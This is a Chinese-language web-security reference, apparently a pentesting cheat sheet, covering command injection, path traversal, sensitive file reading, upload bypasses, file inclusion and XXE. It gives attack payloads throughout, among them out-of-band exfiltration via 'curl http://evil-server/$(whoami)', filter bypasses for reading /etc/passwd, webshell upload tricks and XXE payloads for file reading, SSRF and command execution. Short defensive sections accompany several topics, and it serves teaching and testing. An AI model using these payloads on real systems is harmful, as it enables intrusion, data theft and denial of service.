<h4>常见危险函数<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="php">
<h5>PHP<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>system</li>
<li>exec</li>
<li>passthru</li>
<li>shell_exec</li>
<li>popen</li>
<li>proc_open</li>
</ul>
</div>
<div class="section" id="python">
<h5>Python<a class="headerlink" href="#python" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>system</li>
<li>popen</li>
<li>subprocess.call</li>
<li>spawn</li>
</ul>
</div>
<div class="section" id="java">
<h5>Java<a class="headerlink" href="#java" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>java.lang.Runtime.getRuntime().exec(command)</li>
</ul>
</div>
</div>
<div class="section" id="id4">
<h4>常见注入方式<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>分号分割</li>
<li><code class="docutils literal notranslate"><span class="pre">||</span></code> <code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code> <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> 分割</li>
<li><code class="docutils literal notranslate"><span class="pre">|</span></code> 管道符</li>
<li><code class="docutils literal notranslate"><span class="pre">\r\n</span></code> <code class="docutils literal notranslate"><span class="pre">%d0%a0</span></code> 换行</li>
<li>反引号解析</li>
<li><code class="docutils literal notranslate"><span class="pre">$()</span></code> 替换</li>
</ul>
</div>
<div class="section" id="id5">
<h4>无回显技巧<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>bash反弹shell</li>
<li>DNS带外数据</li>
<li><dl class="first docutils">
<dt>http带外</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">http://evil-server/$(whoami)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">wget</span> <span class="pre">http://evil-server/$(whoami)</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>无带外时利用 <code class="docutils literal notranslate"><span class="pre">sleep</span></code> 或其他逻辑构造布尔条件</li>
</ul>
</div>
<div class="section" id="id6">
<h4>常见绕过方式<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<div class="section" id="id7">
<h5>空格绕过<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;</span></code> 符号 <code class="docutils literal notranslate"><span class="pre">cat&lt;123</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">\t</span></code> / <code class="docutils literal notranslate"><span class="pre">%09</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">${IFS}</span></code> 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串</li>
</ul>
</div>
<div class="section" id="id8">
<h5>黑名单绕过<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">a=l;b=s;$a$b</span></code></li>
<li>base64 <code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">&quot;bHM=&quot;</span> <span class="pre">|</span> <span class="pre">base64</span> <span class="pre">-d</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/?in/?s</span></code> =&gt; <code class="docutils literal notranslate"><span class="pre">/bin/ls</span></code></li>
<li>连接符 <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/pass'w'd</span></code></li>
<li>未定义的初始化变量 <code class="docutils literal notranslate"><span class="pre">cat$x</span> <span class="pre">/etc/passwd</span></code></li>
</ul>
</div>
<div class="section" id="id9">
<h5>长度限制绕过<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&gt;</span><span class="n">wget</span>\
<span class="o">&gt;</span><span class="n">foo</span><span class="o">.</span>\
<span class="o">&gt;</span><span class="n">com</span>
<span class="n">ls</span> <span class="o">-</span><span class="n">t</span><span class="o">&gt;</span><span class="n">a</span>
<span class="n">sh</span> <span class="n">a</span>
</pre></div>
</div>
<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行
直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令
这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看)
如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向
而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
</div>
</div>
<div class="section" id="id10">
<h4>常用符号<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<div class="section" id="id11">
<h5>命令分隔符<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">%0a</span></code> / <code class="docutils literal notranslate"><span class="pre">%0d</span></code> / <code class="docutils literal notranslate"><span class="pre">\n</span></code> / <code class="docutils literal notranslate"><span class="pre">\r</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&amp;</span></code> / <code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code></li>
</ul>
</div>
<div class="section" id="id12">
<h5>通配符<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">*</span></code> 0到无穷个任意字符</li>
<li><code class="docutils literal notranslate"><span class="pre">?</span></code> 一个任意字符</li>
<li><code class="docutils literal notranslate"><span class="pre">[</span> <span class="pre">]</span></code>  一个在括号内的字符，e.g. <code class="docutils literal notranslate"><span class="pre">[abcd]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">[</span> <span class="pre">-</span> <span class="pre">]</span></code>  在编码顺序内的所有字符</li>
<li><code class="docutils literal notranslate"><span class="pre">[^</span> <span class="pre">]</span></code> 一个不在括号内的字符</li>
</ul>
</div>
</div>
<div class="section" id="id13">
<h4>防御<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>不使用时禁用相应函数</li>
<li>尽量不要执行外部的应用程序或命令</li>
<li>做输入的格式检查</li>
<li><dl class="first docutils">
<dt>转义命令中的所有shell元字符</dt>
<dd><ul class="first last">
<li>shell元字符包括 <code class="docutils literal notranslate"><span class="pre">#&amp;;`,|*?~&lt;&gt;^()[]{}$\</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<span id="document-vuln/pathtraversal"></span><div class="section" id="id1">
<h3>目录穿越<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用 <code class="docutils literal notranslate"><span class="pre">../</span></code> 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</p>
</div>
<div class="section" id="id3">
<h4>攻击载荷<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="url">
<h5>URL参数<a class="headerlink" href="#url" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">../</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">..\</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">..;/</span></code></li>
</ul>
</div>
<div class="section" id="nginx-off-by-slash">
<h5>Nginx Off by Slash<a class="headerlink" href="#nginx-off-by-slash" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">https://vuln.site.com/files../</span></code></li>
</ul>
</div>
<div class="section" id="unc-bypass">
<h5>UNC Bypass<a class="headerlink" href="#unc-bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">\\localhost\c$\windows\win.ini</span></code></li>
</ul>
</div>
</div>
<div class="section" id="id4">
<h4>过滤绕过<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>单次替换</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">...//</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>URL编码</li>
<li><dl class="first docutils">
<dt>16位Unicode编码</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">\u002e</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>超长UTF-8编码</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">\%e0%40%ae</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h4>防御<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>在进行文件操作相关的API前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。</p>
<p>若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。</p>
</div>
<div class="section" id="id6">
<h4>参考链接<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://portswigger.net/web-security/file-path-traversal">Directory traversal by portswigger</a></li>
<li><a class="reference external" href="https://www.owasp.org/index.php/Path_Traversal">Path Traversal by OWASP</a></li>
<li><a class="reference external" href="https://blogs.msdn.microsoft.com/jeremykuhne/2016/04/21/path-normalization/">path normalization</a></li>
<li><a class="reference external" href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon</a></li>
</ul>
</div>
</div>
<span id="document-vuln/fileread"></span><div class="section" id="id1">
<h3>文件读取<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<p>考虑读取可能有敏感信息的文件</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>用户目录下的敏感文件</dt>
<dd><ul class="first last">
<li>.bash_history</li>
<li>.zsh_history</li>
<li>.profile</li>
<li>.bashrc</li>
<li>.gitconfig</li>
<li>.viminfo</li>
<li>passwd</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>应用的配置文件</dt>
<dd><ul class="first last">
<li>/etc/apache2/apache2.conf</li>
<li>/etc/nginx/nginx.conf</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>应用的日志文件</dt>
<dd><ul class="first last">
<li>/var/log/apache2/access.log</li>
<li>/var/log/nginx/access.log</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>站点目录下的敏感文件</dt>
<dd><ul class="first last">
<li>.svn/entries</li>
<li>.git/HEAD</li>
<li>WEB-INF/web.xml</li>
<li>.htaccess</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>特殊的备份文件</dt>
<dd><ul class="first last">
<li>.swp</li>
<li>.swo</li>
<li>.bak</li>
<li>index.php~</li>
<li>...</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Python的Cache</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">__pycache__\__init__.cpython-35.pyc</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<span id="document-vuln/fileupload"></span><div class="section" id="id1">
<h3>文件上传<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>文件类型检测绕过<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>更改请求绕过<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。
同样的，有的站点在后端仅检查了HTTP Header中的信息，比如 <code class="docutils literal notranslate"><span class="pre">Content-Type</span></code> 等，这种检查同样可以通过修改网络请求绕过。</p>
</div>
<div class="section" id="magic">
<h5>Magic检测绕过<a class="headerlink" href="#magic" title="永久链接至标题">¶</a></h5>
<p>有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</p>
<table border="1" class="docutils">
<colgroup>
<col width="33%" />
<col width="67%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">类型</th>
<th class="head">二进制值</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>JPG</td>
<td>FF D8 FF E0 00 10 4A 46 49 46</td>
</tr>
<tr class="row-odd"><td>GIF</td>
<td>47 49 46 38 39 61</td>
</tr>
<tr class="row-even"><td>PNG</td>
<td>89 50 4E 47</td>
</tr>
<tr class="row-odd"><td>TIF</td>
<td>49 49 2A 00</td>
</tr>
<tr class="row-even"><td>BMP</td>
<td>42 4D</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id4">
<h5>后缀绕过<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。</p>
<p>php由于历史原因，部分解释器可能支持符合正则 <code class="docutils literal notranslate"><span class="pre">/ph(p[2-7]?|t(ml)?)/</span></code> 的后缀，如 <code class="docutils literal notranslate"><span class="pre">php</span></code> / <code class="docutils literal notranslate"><span class="pre">php5</span></code> / <code class="docutils literal notranslate"><span class="pre">pht</span></code> / <code class="docutils literal notranslate"><span class="pre">phtml</span></code> / <code class="docutils literal notranslate"><span class="pre">shtml</span></code> / <code class="docutils literal notranslate"><span class="pre">pwml</span></code> / <code class="docutils literal notranslate"><span class="pre">phtm</span></code> 等 可在禁止上传php文件时测试该类型。</p>
<p>jsp引擎则可能会解析 <code class="docutils literal notranslate"><span class="pre">jspx</span></code> / <code class="docutils literal notranslate"><span class="pre">jspf</span></code> / <code class="docutils literal notranslate"><span class="pre">jspa</span></code> / <code class="docutils literal notranslate"><span class="pre">jsw</span></code> / <code class="docutils literal notranslate"><span class="pre">jsv</span></code> / <code class="docutils literal notranslate"><span class="pre">jtml</span></code> 等后缀，asp支持 <code class="docutils literal notranslate"><span class="pre">asa</span></code> / <code class="docutils literal notranslate"><span class="pre">asax</span></code> / <code class="docutils literal notranslate"><span class="pre">cer</span></code> / <code class="docutils literal notranslate"><span class="pre">cdx</span></code> / <code class="docutils literal notranslate"><span class="pre">aspx</span></code> / <code class="docutils literal notranslate"><span class="pre">ascx</span></code> / <code class="docutils literal notranslate"><span class="pre">ashx</span></code> / <code class="docutils literal notranslate"><span class="pre">asmx</span></code> / <code class="docutils literal notranslate"><span class="pre">asp{80-90}</span></code> 等后缀。</p>
<p>除了这些绕过，其他的后缀同样可能带来问题，如 <code class="docutils literal notranslate"><span class="pre">vbs</span></code> / <code class="docutils literal notranslate"><span class="pre">asis</span></code> / <code class="docutils literal notranslate"><span class="pre">sh</span></code> / <code class="docutils literal notranslate"><span class="pre">reg</span></code> / <code class="docutils literal notranslate"><span class="pre">cgi</span></code> / <code class="docutils literal notranslate"><span class="pre">exe</span></code> / <code class="docutils literal notranslate"><span class="pre">dll</span></code> / <code class="docutils literal notranslate"><span class="pre">com</span></code> / <code class="docutils literal notranslate"><span class="pre">bat</span></code> / <code class="docutils literal notranslate"><span class="pre">pl</span></code> / <code class="docutils literal notranslate"><span class="pre">cfc</span></code> / <code class="docutils literal notranslate"><span class="pre">cfm</span></code> / <code class="docutils literal notranslate"><span class="pre">ini</span></code> 等。</p>
</div>
<div class="section" id="id5">
<h5>系统命名绕过<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>在Windows系统中，上传 <code class="docutils literal notranslate"><span class="pre">index.php.</span></code> 会重命名为 <code class="docutils literal notranslate"><span class="pre">.</span></code> ，可以绕过后缀检查。
也可尝试 <code class="docutils literal notranslate"><span class="pre">index.php%20</span></code> ， <code class="docutils literal notranslate"><span class="pre">index.php:1.jpg</span></code> <code class="docutils literal notranslate"><span class="pre">index.php::$DATA</span></code> 等。
在Linux系统中，可以尝试上传名为 <code class="docutils literal notranslate"><span class="pre">index.php/.</span></code> 或 <code class="docutils literal notranslate"><span class="pre">./aa/../index.php/.</span></code> 的文件</p>
</div>
<div class="section" id="user-ini">
<h5>.user.ini<a class="headerlink" href="#user-ini" title="永久链接至标题">¶</a></h5>
<p>在php执行的过程中，除了主 <code class="docutils literal notranslate"><span class="pre">php.ini</span></code> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 <code class="docutils literal notranslate"><span class="pre">.user.ini</span></code> 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 <code class="docutils literal notranslate"><span class="pre">.user.ini</span></code> 加上非php后缀的文件构造一个shell，比如 <code class="docutils literal notranslate"><span class="pre">auto_prepend_file=01.gif</span></code> 。</p>
</div>
<div class="section" id="waf">
<h5>WAF绕过<a class="headerlink" href="#waf" title="永久链接至标题">¶</a></h5>
<p>有的waf在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。</p>
<p>另外，Waf和Web系统对 <code class="docutils literal notranslate"><span class="pre">boundary</span></code> 的处理不一致，可以使用错误的 <code class="docutils literal notranslate"><span class="pre">boundary</span></code> 来完成绕过。</p>
</div>
<div class="section" id="id6">
<h5>竞争上传绕过<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。</p>
</div>
</div>
<div class="section" id="id7">
<h4>攻击技巧<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<div class="section" id="apachegetshell">
<h5>Apache重写GetShell<a class="headerlink" href="#apachegetshell" title="永久链接至标题">¶</a></h5>
<p>Apache可根据是否允许重定向考虑上传.htaccess</p>
<p>内容为</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">AddType</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">httpd</span><span class="o">-</span><span class="n">php</span> <span class="o">.</span><span class="n">png</span>
<span class="n">php_flag</span> <span class="n">engine</span> <span class="mi">1</span>
</pre></div>
</div>
<p>就可以用png或者其他后缀的文件做php脚本了</p>
</div>
<div class="section" id="id8">
<h5>软链接任意读文件<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件
若服务器没有做好防护，可实现任意文件读取的效果</p>
</div>
</div>
<div class="section" id="id9">
<h4>防护技巧<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>使用白名单限制上传文件的类型</li>
<li>使用更严格的文件类型检查方式</li>
<li>限制Web Server对上传文件夹的解析</li>
</ul>
</div>
<div class="section" id="id10">
<h4>参考链接<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></li>
</ul>
</div>
</div>
<span id="document-vuln/fileinclude"></span><div class="section" id="id1">
<h3>文件包含<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>基础<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>常见的文件包含漏洞的形式为 <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">include(&quot;inc/&quot;</span> <span class="pre">.</span> <span class="pre">$_GET['file']);</span> <span class="pre">?&gt;</span></code></p>
<p>考虑常用的几种包含方式为</p>
<ul class="simple">
<li>同目录包含 <code class="docutils literal notranslate"><span class="pre">file=.htaccess</span></code></li>
<li>目录遍历 <code class="docutils literal notranslate"><span class="pre">?file=../../../../../../../../../var/lib/locate.db</span></code></li>
<li>日志注入 <code class="docutils literal notranslate"><span class="pre">?file=../../../../../../../../../var/log/apache/error.log</span></code></li>
<li>利用 <code class="docutils literal notranslate"><span class="pre">/proc/self/environ</span></code></li>
</ul>
<p>其中日志可以使用SSH日志或者Web日志等多种日志来源测试</p>
</div>
<div class="section" id="sink">
<h4>触发Sink<a class="headerlink" href="#sink" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>PHP</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>include</dt>
<dd><ul class="first last">
<li>在包含过程中出错会报错，不影响执行后续语句</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>include_once</dt>
<dd><ul class="first last">
<li>仅包含一次</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>require</dt>
<dd><ul class="first last">
<li>在包含过程中出错，就会直接退出，不执行后续语句</li>
</ul>
</dd>
</dl>
</li>
<li>require_once</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id3">
<h4>绕过技巧<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>
<div class="section" id="url">
<h5>url编码绕过<a class="headerlink" href="#url" title="永久链接至标题">¶</a></h5>
<p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
</div>
<div class="section" id="id4">
<h5>特殊字符绕过<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>某些情况下，读文件支持使用Shell通配符，如 <code class="docutils literal notranslate"><span class="pre">?</span></code> <code class="docutils literal notranslate"><span class="pre">*</span></code> 等</li>
<li>url中 使用 <code class="docutils literal notranslate"><span class="pre">?</span></code> <code class="docutils literal notranslate"><span class="pre">#</span></code> 可能会影响include包含的结果</li>
<li>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</li>
</ul>
</div>
<div class="section" id="id5">
<h5>%00截断<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。</p>
</div>
<div class="section" id="id6">
<h5>长度截断<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。</p>
<p>msdn定义 <code class="docutils literal notranslate"><span class="pre">#define</span> <span class="pre">MAX_PATH</span> <span class="pre">260</span></code>，其中第260个字符为字符串结尾的 <code class="docutils literal notranslate"><span class="pre">\0</span></code> ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。</p>
<p>获取最长文件路径长度：getconf PATH_MAX /root 得到4096
获取最长文件名：getconf NAME_MAX /root 得到255</p>
<p>那么在长度有限的时候，<code class="docutils literal notranslate"><span class="pre">././././</span></code> (n个) 的形式就可以通过这个把路径爆掉</p>
<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
</div>
<div class="section" id="id7">
<h5>伪协议绕过<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>远程包含: 要求 <code class="docutils literal notranslate"><span class="pre">allow_url_fopen=On</span></code> 且 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code> ， payload为 <code class="docutils literal notranslate"><span class="pre">?file=[http|https|ftp]://websec.wordpress.com/shell.txt</span></code> 的形式</li>
<li>PHP input: 把payload放在POST参数中作为包含的文件，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code> ，payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://input</span></code> 的形式</li>
<li>Base64: 使用Base64伪协议读取文件，payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://filter/convert.base64-encode/resource=index.php</span></code> 的形式</li>
<li>data: 使用data伪协议读取文件，payload为 <code class="docutils literal notranslate"><span class="pre">?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</span></code> 的形式，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code></li>
</ul>
</div>
<div class="section" id="id8">
<h5>协议绕过<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">allow_url_fopen</span></code> 和 <code class="docutils literal notranslate"><span class="pre">allow_url_include</span></code> 主要是针对 <code class="docutils literal notranslate"><span class="pre">http</span></code> <code class="docutils literal notranslate"><span class="pre">ftp</span></code> 两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。</p>
</div>
</div>
<div class="section" id="id9">
<h4>参考链接<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols</a></li>
<li><a class="reference external" href="https://highon.coffee/blog/lfi-cheat-sheet/">lfi cheat sheet</a></li>
</ul>
</div>
</div>
<span id="document-vuln/xxe"></span><div class="section" id="xxe">
<h3>XXE<a class="headerlink" href="#xxe" title="永久链接至标题">¶</a></h3>
<div class="section" id="xml">
<h4>XML基础<a class="headerlink" href="#xml" title="永久链接至标题">¶</a></h4>
<p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>
</div>
<div class="section" id="id1">
<h4>基本语法<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>XML 文档在开头有 <code class="docutils literal notranslate"><span class="pre">&lt;?xml</span> <span class="pre">version=&quot;1.0&quot;</span> <span class="pre">encoding=&quot;UTF-8&quot;</span> <span class="pre">standalone=&quot;yes&quot;?&gt;</span></code> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。</p>
<p>除了可选的开头外，XML 语法主要有以下的特性：</p>
<ul class="simple">
<li>所有 XML 元素都须有关闭标签</li>
<li>XML 标签对大小写敏感</li>
<li>XML 必须正确地嵌套</li>
<li>XML 文档必须有根元素</li>
<li>XML 的属性值需要加引号</li>
</ul>
<p>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p>
</div>
<div class="section" id="id2">
<h4>XXE<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。</p>
</div>
<div class="section" id="id3">
<h4>攻击方式<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>拒绝服务攻击<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY a0 &quot;dos&quot; &gt;
&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a2;&lt;/data&gt;
</pre></div>
</div>
<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。
具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
</div>
<div class="section" id="id5">
<h5>文件读取<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;data&gt;&amp;file;&lt;/data&gt;
</pre></div>
</div>
</div>
<div class="section" id="ssrf">
<h5>SSRF<a class="headerlink" href="#ssrf" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
&lt;!ELEMENT data (#ANY)&gt;
]&gt;
&lt;data&gt;4&lt;/data&gt;
</pre></div>
</div>
</div>
<div class="section" id="rce">
<h5>RCE<a class="headerlink" href="#rce" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;catalog&gt;
   &lt;core id=&quot;test101&quot;&gt;
      &lt;description&gt;&amp;xxe;&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;
</pre></div>
</div>
</div>
<div class="section" id="xinclude">
<h5>XInclude<a class="headerlink" href="#xinclude" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&#39;1.0&#39;?&gt;
&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;
</pre></div>
</div>
</div>
</div>
